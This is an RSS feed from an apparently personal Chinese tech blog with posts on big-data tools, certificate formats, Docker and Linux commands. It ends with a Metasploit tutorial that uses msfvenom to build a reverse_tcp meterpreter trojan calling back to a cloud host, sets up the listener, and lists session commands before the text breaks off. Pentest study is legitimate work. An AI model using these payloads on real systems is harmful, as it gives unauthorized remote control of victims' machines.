href="#5-大数据技术生态体系" class="headerlink" title="5  大数据技术生态体系"></a>5  大数据技术生态体系</h2><p><img src="/2020/11/12/bigdata-hdfs/1636706809649.png" alt="1636706809649"></p><p>图中涉及的技术名词解释如下：</p><p>1）Sqoop：Sqoop是一款开源的工具，主要用于在Hadoop、Hive与传统的数据库（MySql）间进行数据的传递，可以将一个关系型数据库（例如 ：MySQL，Oracle 等）中的数据导进到Hadoop的HDFS中，也可以将HDFS的数据导进到关系型数据库中。</p><p>2）Flume：Flume是一个高可用的，高可靠的，分布式的海量日志采集、聚合和传输的系统，Flume支持在日志系统中定制各类数据发送方，用于收集数据； </p><p>3）Kafka：Kafka是一种高吞吐量的分布式发布订阅消息系统； </p><p>4）Spark：是当前最流行的开源大数据内存计算框架。可以基于Hadoop上存储的大数据进行计算。</p><p>5）Flink：Flink是当前最流行的开源大数据内存计算框架。用于实时计算的场景较多。</p><p>6）Oozie：Oozie是一个管理Hdoop作业（job）的工作流程调度管理系统。</p><p>7）Hbase：HBase是一个分布式的、面向列的开源数据库。HBase不同于一般的关系数据库，它是一个适合于非结构化数据存储的数据库。</p><p>8）Hive：Hive是基于Hadoop的一个数据仓库工具，可以将结构化的数据文件映射为一张数据库表，并提供简单的SQL查询功能，可以将SQL语句转换为MapReduce任务进行运行。 其优点是学习成本低，可以通过类SQL语句快速实现简单的MapReduce统计，不必开发专门的MapReduce应用，十分适合数据仓库的统计分析。</p><p>9）ZooKeeper：它是一个针对大型分布式系统的可靠协调系统，提供的功能包括：配置维护、名字服务、分布式同步、组服务等。</p><h2 id="参考文献："><a href="#参考文献：" class="headerlink" title="参考文献："></a>参考文献：</h2><p><a href="https://cloud.tencent.com/developer/article/1661405">https://cloud.tencent.com/developer/article/1661405</a></p>]]></content:encoded>
      
      
      <category domain="https://m01ly.github.io/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%BC%80%E5%8F%91/">大数据开发</category>
      
      
      <category domain="https://m01ly.github.io/tags/Hadoop/">Hadoop</category>
      
      
      <comments>https://m01ly.github.io/2020/11/12/bigdata-hdfs/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>证书的各种格式</title>
      <link>https://m01ly.github.io/2020/10/10/cipher-certificate-format/</link>
      <guid>https://m01ly.github.io/2020/10/10/cipher-certificate-format/</guid>
      <pubDate>Sat, 10 Oct 2020 06:56:33 GMT</pubDate>
      
      <description>&lt;p&gt;待完善&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>待完善</p><a id="more"></a><p> 证书主要的文件类型和协议有: PEM、DER、PFX、JKS、KDB、CER、KEY、CSR、CRT、CRL 、OCSP、SCEP等。 </p><p>一编码格式</p><p><a href="https://blog.csdn.net/hqy1719239337/article/details/88896074">https://blog.csdn.net/hqy1719239337/article/details/88896074</a></p><p>二 文件后缀</p><p><a href="https://blog.csdn.net/bolang789/article/details/74942925">https://blog.csdn.net/bolang789/article/details/74942925</a></p><p><a href="https://blog.csdn.net/yetugeng/article/details/100629159">https://blog.csdn.net/yetugeng/article/details/100629159</a></p><p>三 后缀转化</p><p><a href="http://dashy.cn/2020/01/11/%E8%AF%81%E4%B9%A6%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E4%BA%92%E8%BD%AC/">http://dashy.cn/2020/01/11/%E8%AF%81%E4%B9%A6%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E4%BA%92%E8%BD%AC/</a></p>]]></content:encoded>
      
      
      
      <category domain="https://m01ly.github.io/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/">密码学</category>
      
      
      <comments>https://m01ly.github.io/2020/10/10/cipher-certificate-format/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>docker使用大全</title>
      <link>https://m01ly.github.io/2020/09/28/docker-guide/</link>
      <guid>https://m01ly.github.io/2020/09/28/docker-guide/</guid>
      <pubDate>Mon, 28 Sep 2020 07:22:20 GMT</pubDate>
      
      <description>&lt;p&gt;自己检索方便&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>自己检索方便</p><a id="more"></a><h1 id="1-docker安装"><a href="#1-docker安装" class="headerlink" title="1 docker安装"></a>1 docker安装</h1><h4 id="1-1卸载旧版本"><a href="#1-1卸载旧版本" class="headerlink" title="1.1卸载旧版本"></a>1.1卸载旧版本</h4><p>较旧的 Docker 版本称为 docker 或 docker-engine 。如果已安装这些程序，请卸载它们以及相关的依赖项。</p><pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">sudo</span> yum remove  docker \         docker-client \         docker-client-latest \         docker-common \         docker-latest \         docker-latest-logrotate \         docker-logrotate \         docker-engine<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在新主机上首次安装 Docker Engine-Community 之前，需要设置 Docker 仓库。之后，您可以从仓库安装和更新 Docker。</p><h4 id="1-2安装-Docker-Engine-Community"><a href="#1-2安装-Docker-Engine-Community" class="headerlink" title="1.2安装 Docker Engine-Community"></a>1.2安装 Docker Engine-Community</h4><p><strong>设置仓库</strong></p><p>安装所需的软件包。yum-utils 提供了 yum-config-manager ，并且 device mapper 存储驱动程序需要 device-mapper-persistent-data 和 lvm2。</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> yum <span class="token function">install</span>  -y yum-utils \ device-mapper-persistent-data \ lvm2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>可以选择国内的一些aliyun源地址：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> yum-config-manager \    --add-repo \    http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="1-3安装-Docker-Engine-Community"><a href="#1-3安装-Docker-Engine-Community" class="headerlink" title="1.3安装 Docker Engine-Community"></a>1.3安装 Docker Engine-Community</h4><p>安装最新版本的 Docker Engine-Community 和 containerd，或者转到下一步安装特定版本：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> yum <span class="token function">install</span> docker-ce docker-ce-cli containerd.io<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="1-4启动-Docker。"><a href="#1-4启动-Docker。" class="headerlink" title="1.4启动 Docker。"></a>1.4启动 Docker。</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> systemctl start docker<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>通过运行 hello-world 映像来验证是否正确安装了 Docker Engine-Community 。</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> docker run hello-world<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/09/28/docker-guide/1603272603871.png" alt="1603272603871"></p><h4 id="1-5-CentOS中修改Docker的默认根目录"><a href="#1-5-CentOS中修改Docker的默认根目录" class="headerlink" title="1.5  CentOS中修改Docker的默认根目录"></a>1.5  CentOS中修改Docker的默认根目录</h4><p>1） 先使用: ‘docker info’ 命令,看下原来默认的根目录位置</p><pre class="line-numbers language-bash"><code class="language-bash">docker info<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2）先关闭docker服务</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">service</span> docker stop<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3）直接修改/etc/docker/daemon.json:</p><p>修改docker安装目录到/mnt目录：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>    <span class="token string">"data-root"</span><span class="token keyword">:</span> <span class="token string">"/mnt/docker"</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>4）在你指定的目录位置新建文件夹 /new-path/docker</p><p>5）重启docker服务</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">service</span> docker start<span class="token function">sudo</span> systemctl start docker<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>6）使用docker info命令确认是否修改成功</p><h1 id="2-docker常用命令"><a href="#2-docker常用命令" class="headerlink" title="2 docker常用命令"></a>2 docker常用命令</h1><pre class="line-numbers language-bash"><code class="language-bash"><span class="token variable">$docker</span> search ubantu <span class="token comment" spellcheck="true">#搜索镜像</span><span class="token variable">$docker</span> pull ubantu  <span class="token comment" spellcheck="true">#载入镜像</span><span class="token variable">$docker</span> run -it ubuntu /bin/bash <span class="token comment" spellcheck="true">#启动镜像</span>root@ed09e4490c57:/<span class="token comment" spellcheck="true"># exit退出容器</span>$ docker <span class="token function">ps</span> -a  <span class="token comment" spellcheck="true">#查看所有的容器</span>$ docker <span class="token function">ps</span> -l <span class="token comment" spellcheck="true">#查看最后一次创建的容器</span>$ docker start b750bbbcfd88  <span class="token comment" spellcheck="true">#使用 docker start 启动一个已停止的容器</span>$ docker stop <span class="token operator">&lt;</span>容器 ID<span class="token operator">></span>  <span class="token comment" spellcheck="true">#停止一个容器</span>$ docker restart <span class="token operator">&lt;</span>容器 ID<span class="token operator">></span>  <span class="token comment" spellcheck="true">#重启一个容器</span>$ docker <span class="token function">rm</span> -f <span class="token operator">&lt;</span>容器 ID<span class="token operator">></span> <span class="token comment" spellcheck="true">#删除一个容器</span>$ docker rmi  <span class="token operator">&lt;</span>镜像名称<span class="token operator">></span> <span class="token comment" spellcheck="true">#删除一个镜像</span>$ docker run -itd --name ubuntu-test ubuntu /bin/bash <span class="token comment" spellcheck="true">#后台运行容器</span>$ docker <span class="token function">exec</span> -it <span class="token operator">&lt;</span>容器 ID<span class="token operator">></span> /bin/bash <span class="token comment" spellcheck="true">#进入一个容器</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>镜像打包如下：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token variable">$docker</span> <span class="token function">ps</span> <span class="token variable">$docker</span> login harbor.XX.io/openvas <span class="token comment" spellcheck="true">#输入域帐号&amp;密码</span><span class="token variable">$docker</span> commit <span class="token operator">&lt;</span>容器name<span class="token operator">></span> harbor.XX.io/openvas:<span class="token punctuation">[</span>tag_openvas_20200710_XXXX<span class="token punctuation">]</span><span class="token variable">$docker</span> push harbor.XX.io/openvas:<span class="token punctuation">[</span>tag_openvas_20200710_XXXX<span class="token punctuation">]</span> <span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-1-docker-访问宿主机目录"><a href="#2-1-docker-访问宿主机目录" class="headerlink" title="2.1 docker 访问宿主机目录"></a>2.1 docker 访问宿主机目录</h2><h3 id="挂载一个目录"><a href="#挂载一个目录" class="headerlink" title="挂载一个目录"></a>挂载一个目录</h3><pre class="line-numbers language-bash"><code class="language-bash">docker run -it -v <span class="token variable">$path_to_host_data</span><span class="token keyword">:</span><span class="token variable">$new_path_in_docker</span> deep_sleepnet:1.0 /bin/bash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> 执行之后，相当于把此数据目录挂载在对应docker的目录中，用  即可查看并访问所挂载数据。Dockerfile中最后一行运行相应的 </p><p>例如：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@m01ly ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># docker run -it -m 4G -v /var/log/suricata:/mnt -p 5601:5601 -p 9200:9200 -p 5044:5044 sebp/elk: 638</span><span class="token punctuation">[</span>root@m01ly ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># docker ps -a</span>CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS                                                                              NAMES45a7bc7b174d        sebp/elk:623        <span class="token string">"/usr/local/bin/star…"</span>   13 hours ago        Up 12 hours         0.0.0.0:5044-<span class="token operator">></span>5044/tcp, 0.0.0.0:5601-<span class="token operator">></span>5601/tcp, 0.0.0.0:9200-<span class="token operator">></span>9200/tcp, 9300/tcp   charming_wu<span class="token punctuation">[</span>root@m01ly ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># docker exec -it 45a7bc7b174d bash</span>root@45a7bc7b174d:/<span class="token comment" spellcheck="true"># ls</span>bd_build  bin  boot  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到宿主机文件夹mnt</p><p><img src="/2020/09/28/docker-guide/1603765650364.png" alt="1603765650364"></p><h3 id="挂载两个目录"><a href="#挂载两个目录" class="headerlink" title="挂载两个目录"></a>挂载两个目录</h3><p>注意每个目录前都要加参数-v</p><pre class="line-numbers language-bash"><code class="language-bash">docker run -it -v <span class="token variable">$path_to_host_data</span><span class="token keyword">:</span><span class="token variable">$new_path_in_docker</span> -v <span class="token variable">$path1_to_host_data</span><span class="token keyword">:</span><span class="token variable">$new_path1_in_docker</span> deep_sleepnet:1.0 /bin/bash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2-2-查看docker容器linux版本"><a href="#2-2-查看docker容器linux版本" class="headerlink" title="2.2 查看docker容器linux版本"></a>2.2 查看docker容器linux版本</h2><p>查看 Docker Linux 容器系统对应发行版本。</p><p>使用如下命令查看。</p><pre class="line-numbers language-shell"><code class="language-shell">cat /etc/issue<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>而常用的 <code>uname -a</code> 等等命令，则是查看到宿主机的发行版本</p><p><img src="/2020/09/28/docker-guide/1615972275875.png" alt="1615972275875"></p><h2 id="2-3-集合操作"><a href="#2-3-集合操作" class="headerlink" title="2.3 集合操作"></a>2.3 集合操作</h2><h4 id="列出所有的容器-ID"><a href="#列出所有的容器-ID" class="headerlink" title="列出所有的容器 ID"></a>列出所有的容器 ID</h4><pre class="line-numbers language-bash"><code class="language-bash">docker <span class="token function">ps</span> -aq<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="停止所有的容器"><a href="#停止所有的容器" class="headerlink" title="停止所有的容器"></a>停止所有的容器</h4><pre class="line-numbers language-bash"><code class="language-bash">docker stop <span class="token variable"><span class="token variable">$(</span>docker <span class="token function">ps</span> -aq<span class="token variable">)</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="删除所有的容器"><a href="#删除所有的容器" class="headerlink" title="删除所有的容器"></a>删除所有的容器</h4><pre class="line-numbers language-bash"><code class="language-bash">docker <span class="token function">rm</span> <span class="token variable"><span class="token variable">$(</span>docker <span class="token function">ps</span> -aq<span class="token variable">)</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="删除所有的镜像"><a href="#删除所有的镜像" class="headerlink" title="删除所有的镜像"></a>删除所有的镜像</h4><pre class="line-numbers language-bash"><code class="language-bash">docker rmi <span class="token variable"><span class="token variable">$(</span>docker images -q<span class="token variable">)</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="删除所有不使用的镜像"><a href="#删除所有不使用的镜像" class="headerlink" title="删除所有不使用的镜像"></a>删除所有不使用的镜像</h4><pre class="line-numbers language-bash"><code class="language-bash">docker image prune --force --all或者docker image prune -f -a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="删除所有停止的容器"><a href="#删除所有停止的容器" class="headerlink" title="删除所有停止的容器"></a>删除所有停止的容器</h4><pre class="line-numbers language-bash"><code class="language-bash">docker container prune -f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="批量删除镜像"><a href="#批量删除镜像" class="headerlink" title="批量删除镜像"></a>批量删除镜像</h4><p>可以删除所有名字中带 “none” 关键字的镜像，即可以把所有编译错误的镜像删除。</p><pre class="line-numbers language-bash"><code class="language-bash">docker rmi <span class="token punctuation">$(</span>docker images <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"none"</span> <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'&amp;#123;print <span class="token variable">$3</span>&amp;#125;'</span><span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上面这条命令，可以删除所有名字中带 “none” 关键字的镜像，即可以把所有编译错误的镜像删除。</p><p>这个 grep 后面的参数，就是筛选出名字中包含这个参数的镜像。</p>]]></content:encoded>
      
      
      
      <category domain="https://m01ly.github.io/tags/%E5%AE%B9%E5%99%A8%E6%95%99%E7%A8%8B/">容器教程</category>
      
      
      <comments>https://m01ly.github.io/2020/09/28/docker-guide/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>linux命令大全</title>
      <link>https://m01ly.github.io/2020/09/28/linux-cmd/</link>
      <guid>https://m01ly.github.io/2020/09/28/linux-cmd/</guid>
      <pubDate>Mon, 28 Sep 2020 07:22:20 GMT</pubDate>
      
      <description>&lt;p&gt;linux命令大全，方便自己检索&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>linux命令大全，方便自己检索</p><a id="more"></a><h4 id="重命名："><a href="#重命名：" class="headerlink" title="重命名："></a>重命名：</h4><pre><code>原字符串：将文件名需要替换的字符串；目标字符串：将文件名中含有的原字符替换成目标字符串；文件：指定要改变文件名的文件列表。</code></pre><pre><code>rename main1.c main.c main1.c</code></pre><h4 id="复制文件："><a href="#复制文件：" class="headerlink" title="复制文件："></a>复制文件：</h4><pre><code> cp -i file1 dir1</code></pre><h4 id="linux-查看进程"><a href="#linux-查看进程" class="headerlink" title="linux 查看进程"></a>linux 查看进程</h4><p>ps -ef/  ps -aux </p><p>[root@ids0001 logstash]# ps -ef |grep logstash</p><h4 id="杀死进程"><a href="#杀死进程" class="headerlink" title="杀死进程"></a>杀死进程</h4><p>kill 1827 </p><p>kill -9 1827</p><h4 id="查看内存"><a href="#查看内存" class="headerlink" title="查看内存"></a>查看内存</h4><pre><code>free -m</code></pre><h4 id="查看进程所用内存"><a href="#查看进程所用内存" class="headerlink" title="查看进程所用内存"></a>查看进程所用内存</h4><pre><code>top然后按M进行排序</code></pre><h4 id="后台运行"><a href="#后台运行" class="headerlink" title="后台运行"></a>后台运行</h4><pre><code>sudo nohup cmd </code></pre><p>sudo nohup /usr/share/logstash/bin/logstash -f /etc/logstash/conf.d/logstash.conf &amp;</p><h4 id="inotify命令"><a href="#inotify命令" class="headerlink" title="inotify命令"></a><a href="https://cloud.tencent.com/developer/article/1417976">inotify命令</a></h4><p>功能：监控某个目录的文件是否发生变化执行相应脚本 </p><p>（0）首先查看系统内核是否支持inotify功能   ls -l /proc/sys/fs/inotify，出现如下内容说明支持：</p><pre class="line-numbers language-bash"><code class="language-bash">total 0-rw-r--r-- 1 root root 0 Apr 23 15:23 max_queued_events-rw-r--r-- 1 root root 0 Apr 24 22:11 max_user_instances-rw-r--r-- 1 root root 0 Apr 23 15:23 max_user_watches<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>或通过 uname -a 查看当前系统内核版本是否在2.6.13 以上：</p><pre class="line-numbers language-bash"><code class="language-bash">Linux VM_3_105_centos 3.10.107 x86_64 GNU/Linux<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（1）查看是否安装</p><pre class="line-numbers language-bash"><code class="language-bash">rpm -qa inotify-tools <span class="token comment" spellcheck="true">#如果没安装</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>没有回显则没有安装</p><p>（2）安装inotify</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">wget</span> -O /etc/yum.repos.d/epel.repo http://mirrors.aliyun.com/repo/epel-6.repoyum <span class="token function">install</span> inotify-tools -y<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2020/09/28/linux-cmd/1604557978079.png" alt="1604557978079"></p><p>(3) 查看版本</p><p><img src="/2020/09/28/linux-cmd/1604558015626.png" alt="1604558015626"></p><p>(4)使用教程</p><p>1）创建执行脚本：inotifytest.sh脚本：监控/root/testdir目录，输出目录的CRUD变化。<a href="https://blog.csdn.net/zzmfish/article/details/48787355?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-2.channel_param&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-2.channel_param">参考使用inotifywait同步修改的文件到服务器</a>。</p><pre class="line-numbers language-sh"><code class="language-sh">#!/bin/bash#监视目录和目标目录FROM_DIR="/root/testdir"#inotifywait -m -r --timefmt "%F %T" --format "%e %w %f" -o /var/log/change.log $FROM_DIRinotifywait -m --format "%e %w %f" $FROM_DIR | while read eventName dirName fileName; do    #显示事件    echo "-- Event:$eventName Dir:$dirName File:$fileName"    #忽略“.”开头和“_”结束的文件    if [[ $fileName == .* ]] || [[ $fileName == *_ ]]; then        continue    fi    #复制改动的文件（有些IDE会在临时文件编辑，保存时同够移动覆盖原文件）    case $eventName in    CREATE)        echo "create $fileName"        sudo /usr/local/bin/suricata -c /etc/suricata/suricata.yaml -r /tmp/$&#123;$fileName&#125; -l  /var/log/suricata/cap        #cp -v $&#123;dirName&#125;$&#123;fileName&#125; $TO_DIR/$dirName    esacdone<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2）执行监听脚本</p><pre><code>./inotifytest.sh#启动监听脚本，观察文件夹内的变化</code></pre><p><img src="/2020/09/28/linux-cmd/1604562579710.png" alt="1604562579710"></p><p>执行下面脚本，在文件夹内新增文件</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span>int<span class="token operator">=</span>1<span class="token keyword">while</span><span class="token variable"><span class="token punctuation">((</span> $int<span class="token operator">&lt;=</span><span class="token number">10</span> <span class="token punctuation">))</span></span>do+    <span class="token keyword">echo</span> <span class="token variable">$int</span>    <span class="token function">cp</span> /tmp/test.cap /root/testdir/$<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;int&amp;#125;.cap</span>    <span class="token keyword">let</span> <span class="token string">"int++"</span><span class="token keyword">done</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="crontab定时"><a href="#crontab定时" class="headerlink" title="crontab定时"></a>crontab定时</h4><p><a href="https://www.cnblogs.com/wenzheshen/p/8432588.html">https://www.cnblogs.com/wenzheshen/p/8432588.html</a></p><p><a href="https://blog.csdn.net/ithomer/article/details/6817019">https://blog.csdn.net/ithomer/article/details/6817019</a></p><p><a href="https://www.jellythink.com/archives/155">https://www.jellythink.com/archives/155</a></p><p>新建脚本time.sh 内容如下，防止suricata执行时间过长，有些文件没有执行到就被删除了</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token function">cp</span> -Rf /root/testdir/ /root/temp/<span class="token function">rm</span> -rf /root/testdir/*suricata -c /etc/suricata/suricata.yaml -r /root/temp/<span class="token function">rm</span> -rf /root/temp/*<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在终端输入以下命令：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">crontab</span> -e<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在显示的文件末尾添加以下规则：#每5分钟运行一次time.sh脚本,并把错误和正确的日志都存到/tmp/load.log上。</p><pre class="line-numbers language-bash"><code class="language-bash">*/5 * * * * /root/time.sh <span class="token operator">></span> /tmp/load.log 2<span class="token operator">></span><span class="token operator">&amp;</span>1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>编辑完成，保存完成以后，就会显示以下提示信息：</p><pre class="line-numbers language-bash"><code class="language-bash">crontab: installing new <span class="token function">crontab</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这就说明正在安装新的定时任务，如果没有这条提示信息，请重新运行<code>crontab -e</code>命令。</p><p><img src="/2020/09/28/linux-cmd/1604578836302.png" alt="1604578836302"></p><p>每一分钟请求一个地址</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">crontab</span> -e*/1 * * * *  /usr/bin/curl https://www.baidu.com/ <span class="token operator">></span> /tmp/load.log 2<span class="token operator">></span><span class="token operator">&amp;</span>1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>2.将正确和错误日志都输出到 /tmp/load.log</p><pre class="line-numbers language-bash"><code class="language-bash">*/1 * * * * /root/XXXX.sh <span class="token operator">></span> /tmp/load.log 2<span class="token operator">></span><span class="token operator">&amp;</span>1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>最后推荐个在线网站 解读表达式<a href="https://tool.lu/crontab">https://tool.lu/crontab</a></p><p><img src="/2020/09/28/linux-cmd/1617957777906.png" alt="1617957777906"></p><h4 id="删除rm"><a href="#删除rm" class="headerlink" title="删除rm"></a>删除rm</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cp</span> -Rf /home/user1/* /root/temp/将 /home/user1目录下的所有东西拷到/root/temp/下而不拷贝user1目录本身。即格式为：cp -Rf 原路径/ 目的路径/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>]]></content:encoded>
      
      
      
      
      <comments>https://m01ly.github.io/2020/09/28/linux-cmd/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>在阿里云主机反弹metosploit</title>
      <link>https://m01ly.github.io/2020/09/28/pt-metosploitInAliyun/</link>
      <guid>https://m01ly.github.io/2020/09/28/pt-metosploitInAliyun/</guid>
      <pubDate>Mon, 28 Sep 2020 07:22:20 GMT</pubDate>
      
      <description>&lt;h2 id=&quot;前提&quot;&gt;&lt;a href=&quot;#前提&quot; class=&quot;headerlink&quot; title=&quot;前提&quot;&gt;&lt;/a&gt;前提&lt;/h2&gt;&lt;p&gt;一般反弹shell，需要一个公网Ip的机器，这里我们选择阿里云主机，因为阿里云主机默认是只开放了固定端口，因此我们想要对某个端口监听的，首先需要开起阿里云的具体端口，这里我们选择7777作为监听端口，具体配置如下图所示。这里还应该注意的是阿里云主机有两个IP，一个是公网IP，另外一个是内网IP，具体用法下面会说到。&lt;/p&gt;
&lt;p&gt;利用阿里云作为反弹主机，因为阿里云主机默认是将端口关闭的，因此首先需要允许对应端口开放，这里我选择的是7777，具体配置如下图所示。需要注意的是，阿里主机有两个IP，一个为公网IP，一个为内网IP，这两个IP后面会说到。&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h2><p>一般反弹shell，需要一个公网Ip的机器，这里我们选择阿里云主机，因为阿里云主机默认是只开放了固定端口，因此我们想要对某个端口监听的，首先需要开起阿里云的具体端口，这里我们选择7777作为监听端口，具体配置如下图所示。这里还应该注意的是阿里云主机有两个IP，一个是公网IP，另外一个是内网IP，具体用法下面会说到。</p><p>利用阿里云作为反弹主机，因为阿里云主机默认是将端口关闭的，因此首先需要允许对应端口开放，这里我选择的是7777，具体配置如下图所示。需要注意的是，阿里主机有两个IP，一个为公网IP，一个为内网IP，这两个IP后面会说到。<a id="more"></a></p><p><img src="/2020/09/28/pt-metosploitInAliyun/1602814914926.png" alt="1602814914926"></p><h2 id="反弹shell步骤"><a href="#反弹shell步骤" class="headerlink" title="反弹shell步骤"></a>反弹shell步骤</h2><p>步骤如下：</p><p>1）生成载荷/木马，注意这里用的是阿里云公网IP（<a href="https://www.cnblogs.com/LyShark/p/12189163.html">生成各种载荷</a>）</p><pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=阿里云公网IP lport=7777 -f exe &gt; load.exe</code></pre><p>2） 阿里云主机开始监听</p><pre><code>msfconsle #打开msfuse exploit/multi/handlerset payload windows/meterpreter/reverse_tcp #注意这里的载荷要和生成木马对应的载荷相同options #查看选项set LHOST 阿里云内网IP #设置监听IPset LPORT 7777  #设置监听端口run/exploit#开始监听</code></pre><p>3)目标主机执行载荷/木马</p><p>双击Exe，如果是linux下，生成的elf木马</p><pre><code>chmod muma.elf#赋可执行权限./muma.elf #执行木马</code></pre><p>4）观察阿里云主机是否连接成功，如下图表示连接成功</p><p><img src="/2020/09/28/pt-metosploitInAliyun/1610957093533.png" alt="1610958466075"></p><p>5）连接成功后，meterpreter常用命令如下。</p><p><strong>基本命令</strong></p><pre class="line-numbers language-bash"><code class="language-bash">background  <span class="token comment" spellcheck="true"># 让meterpreter处于后台模式  </span>sessions -i index   <span class="token comment" spellcheck="true"># 与会话进行交互，index表示第一个session  </span>quit  <span class="token comment" spellcheck="true"># 退出会话  </span>shell <span class="token comment" spellcheck="true"># 获得控制台权限  </span>irb <span class="token comment" spellcheck="true"># 开启ruby终端</span><span aria-hidden="true" 